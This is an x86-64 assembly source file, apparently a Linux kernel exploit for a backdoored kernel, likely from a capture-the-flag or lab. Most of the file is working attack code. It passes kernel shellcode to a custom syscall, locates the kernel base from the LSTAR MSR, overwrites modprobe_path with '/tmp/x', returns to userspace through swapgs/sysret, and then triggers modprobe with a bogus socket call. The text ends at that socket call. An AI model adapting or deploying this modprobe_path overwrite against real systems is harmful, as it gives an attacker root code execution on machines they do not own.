section .data
    starting:        db '[+] Running exploit...',0
    starting_len:    equ $-starting-1

    shellcode_len:   equ 0x100

section .text
    global _start

_start:
    ; jump to trigger_modprobe if there's a cmdline arg
    mov rsi, [rsp + 0x10]
    cmp rsi, 0
    jne trigger_modprobe

    ; print start message
    mov rax, 1                  ; syscall number for sys_write
    mov rdi, 1                  ; file descriptor (stdout)
    mov rsi, starting           ; pointer to the message
    mov rdx, starting_len       ; length of the message
    syscall                     ; invoke the syscall

    ; run backdoor
    mov rax, 1337
    mov rdi, _shellcode
    mov rsi, shellcode_len
    syscall                     ; invoke the syscall

    jmp exit


_shellcode:
    ; put IA32_LSTAR MSR address into rax
    mov ecx, 0xC0000082
    rdmsr
    shl rdx, 32
    or rax, rdx

    ; calculate base address
    sub rax, 0x80

    ; calculate modprobe_path address
    add rax, 0x1b48960

    ; write "/tmp/x" to modprobe_path
    mov r9, 0x782f706d742f
    mov [rax], r9

    ; return to userspace at $rcx
    mov rcx, 0x401073
    mov r11, 0x202
    swapgs
    sysret


exit:
    mov edi, eax
    mov eax, 0x3c
    syscall

trigger_modprobe:
    ; open a socket?
    mov rax, 41                 ; syscall number for sys_socket
    mov rdi, 2                  ; domain (AF_INET)
    mov rsi, 1                  ; type (SOCK_STREAM)
    mov rdx, 255                ; protocol (IPPROTO_MAX-1)
    syscall                     ; invoke the syscall